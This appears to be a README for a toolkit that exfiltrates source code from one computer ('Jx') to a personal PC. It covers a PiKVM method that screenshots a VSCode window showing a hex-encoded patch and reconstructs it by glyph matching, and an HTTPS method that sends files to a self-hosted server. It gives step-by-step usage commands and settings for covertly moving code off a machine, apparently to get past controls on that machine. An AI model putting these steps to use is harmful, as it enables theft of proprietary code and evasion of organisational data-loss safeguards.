# Terms
This repo will require two computers, which I will refer to as Jx and PC. Jx is the computer you want to exfiltrate code from. PC is your personal device where you receive the code.

# PiKVM Image Exfiltration  
## Tests  
Test different VSCode font settings. I've found the following settings work best, showing about 40x190 rows and columns. Use a light theme or invert the colors in the script.
```
"workbench.colorTheme": "Default Light Modern",
"editor.fontWeight": "bold",
"editor.fontSize": 18,
"editor.fontFamily": "Consolas"
```
Update the hostname and authentication information in test.py and run. Inspect the temp images to ensure the editor is correctly cropped and there are little to no edges. Re-run the test.py script as needed to get the correct CROP_DIMENSIONS. Experiment with different font weights, font sizes, font families, and crop dimensions until there is a matched string.

## Usage
Update the constants in pikvm_exfil.py  
Jx: Run `create_patch.py <repo>` to create a patch and hex file.  
Jx: Navigate to the created .hex file and update your VSCode font settings. Ensure the hex file starts at the top of the file. It will use the first line to create a glyph map.  
PC: Start the script. Note that this script is computationally expensive for both your PiKVM and PC. It will take screenshots every 100ms and process.  
Jx: Run `pgdn.ps1` to press PgDn on the VSCode window. Click into the code editor to apply the PgDn command. Ctrl+C to stop the script when done.  
PC: Ctrl+C the script when done. The output strings will be combined together and the first line glyph map will be removed. The resulting string will be written to a hex file and converted into a patch file.  
PC: Run `apply_patch.py <patch_path> <repo>` to apply the patch file to the repo  

## Performance Notes
It's slow AF, we're limited by the PiKVM screenshot api. HDMI Exfil will be faster because you can process at 60hz.

# HDMI Image Exfiltration  
Coming soon!

# HTTPS Exfiltration
PC: Run this command in the temp folder to create cert and key files: `openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365`  
PC: Start `server_exfil.py`  
Jx: Run `https_send_file.py <file> <host:port>`  

# TODO
Image Exfiltration with HDMI  
HTTPS Exfiltration features  
Glyph matching with vpi (https://docs.nvidia.com/vpi/sample_template_matching.html) and python CUDA (https://nvidia.github.io/cuda-python/latest)  